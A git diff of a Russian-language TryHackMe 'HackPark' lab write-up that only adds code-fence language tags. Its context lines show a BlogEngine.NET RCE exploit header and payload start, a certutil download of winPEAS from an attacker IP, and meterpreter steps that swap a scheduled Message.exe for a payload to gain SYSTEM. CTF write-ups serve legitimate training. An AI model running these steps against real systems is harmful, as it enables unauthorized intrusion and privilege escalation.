@@ -89,7 +89,7 @@ login: **admin**   password: **1qaz2wsx**
 ## 📂 Получение доступа
 
 Exploit для BlogEngine.NET <= 3.3.6 Directory Traversal RCE
-```
+```js
 <%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
 <%@ Import Namespace="BlogEngine.Core" %>
 
@@ -254,7 +254,7 @@ certutil -urlcache -f http://10.21.104.16:8888/winPEASx64.exe winPEASany.exe
 ```
 
 Перехожу в **"c:\Program Files (x86)\SystemScheduler"**
-```
+```bash
 meterpreter > ls
 Listing: c:\Program Files (x86)\SystemScheduler
 ===============================================
@@ -303,7 +303,7 @@ Mode              Size     Type  Last modified              Name
 ```
 
 И читаю логи, нахожу Message.exe, который запускается каждые 30 секунд
-```
+```bash
 meterpreter > cd Events
 meterpreter > ls
 Listing: c:\Program Files (x86)\SystemScheduler\Events
@@ -334,7 +334,7 @@ meterpreter > cat 20198415519.INI_LOG.txt
 ```
 
 Загружаю **meter-5555.exe** в **"c:\Program Files (x86)\SystemScheduler\"** вместо **Message.exe** и получаю SYSTEM
-```
+```bash
 meterpreter > upload /home/kali/Labs/TryHackMe/Win\ Medium\ -\ HackPark/exploits/meter-5555.exe
 meterpreter > mv Message.exe Message.bak
 meterpreter > mv meter-5555.exe Message.exe
